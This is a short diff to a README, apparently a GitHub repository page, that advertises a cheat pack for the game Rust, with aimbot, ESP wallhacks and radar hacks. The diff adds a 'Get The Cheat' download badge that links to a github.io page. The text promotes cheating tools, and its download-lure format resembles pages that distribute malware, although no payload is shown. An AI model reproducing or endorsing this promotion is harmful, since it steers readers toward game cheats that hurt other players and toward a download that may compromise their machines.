@@ -4,6 +4,7 @@
 
 **Rust** is one of the toughest survival sandboxes out there. Between base building, raiding, and brutal PvP, only the strongest survive. For those who want to skip the grind and get straight to dominating, the **Rust cheat pack** delivers everything – **aimbot, ESP wallhacks, radar hacks, trainers, and cheat menus**.
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://rust-cheat-hack.github.io/.github/)
 ---
 
 ## Product Description
